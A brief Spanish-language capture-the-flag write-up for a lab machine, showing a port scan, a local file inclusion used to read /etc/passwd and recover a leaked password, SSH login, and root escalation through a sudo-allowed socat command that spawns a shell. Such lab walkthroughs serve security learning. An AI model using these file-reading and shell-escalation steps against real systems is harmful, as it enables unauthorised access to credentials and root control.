# Inclusion
Room sencillita para explotar un LFI

## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
```
## Enum
### HTTP

Vemos que los articulos se indexan mediante el nombre directo del archivo
```
http://10.10.30.43/article?name=lfiattack
```
Probamos a indexar algún archivo mas sensible como /etc/passwd
```
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#falconfeast:rootpassword
```
Usamos esas creds en el ssh y pa dentro

## Privesc
```
User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```
Y simplemente ejecutamos 
```
sudo socat stdin exec:/bin/sh
```
Y listo, ya somos root
